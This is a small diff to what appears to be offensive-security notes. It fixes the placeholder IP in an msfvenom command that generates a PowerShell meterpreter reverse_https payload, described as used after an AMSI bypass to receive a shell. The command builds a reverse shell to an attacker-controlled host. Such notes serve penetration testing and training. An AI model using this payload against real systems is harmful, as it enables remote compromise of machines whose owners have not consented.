@@ -3,7 +3,7 @@ Once AMSI has been bypassed, the following can be used to receive a shell
 Create PS1 msfvenom payload:
 
 ```bash
-sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x LPORT=8081 -f ps1
+sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=8081 -f ps1
 ```
 
 Update run.txt:
